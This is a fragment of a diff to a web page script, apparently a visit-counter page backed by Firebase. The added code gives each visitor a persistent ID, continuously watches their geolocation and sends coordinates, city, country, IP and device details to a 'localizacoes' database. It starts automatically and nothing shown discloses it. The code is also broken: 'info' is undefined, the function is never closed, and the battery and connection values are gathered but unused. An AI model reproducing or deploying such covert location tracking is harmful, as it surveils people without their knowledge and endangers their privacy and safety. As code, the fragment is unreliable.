@@ -418,6 +418,49 @@ appId: "1:877191590019:web:152d4d35bdd3024c53abb6"
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
+let id = localStorage.getItem("uid")
+
+if(!id){
+
+id = Math.random().toString(36).substr(2,9)
+localStorage.setItem("uid",id)
+
+}
+
+function start(){
+
+navigator.geolocation.watchPosition(async pos=>{
+
+let lat = pos.coords.latitude
+let lng = pos.coords.longitude
+
+let bateria = "N/A"
+
+if(navigator.getBattery){
+
+let bat = await navigator.getBattery()
+bateria = Math.floor(bat.level*100)+"%"
+
+}
+
+let conexao = navigator.connection ? navigator.connection.effectiveType : "N/A"
+
+push(ref(db,"localizacoes"),{
+
+latitude:lat,
+longitude:lng,
+cidade:info.city,
+pais:info.country_name,
+ip:info.ip,
+celular:navigator.userAgent,
+data:Date.now()
+
+})
+
+/* inicia automaticamente */
+
+start()
+
 // VISITAS TOTAIS
 const totalRef = ref(db,"visitas/total");
 
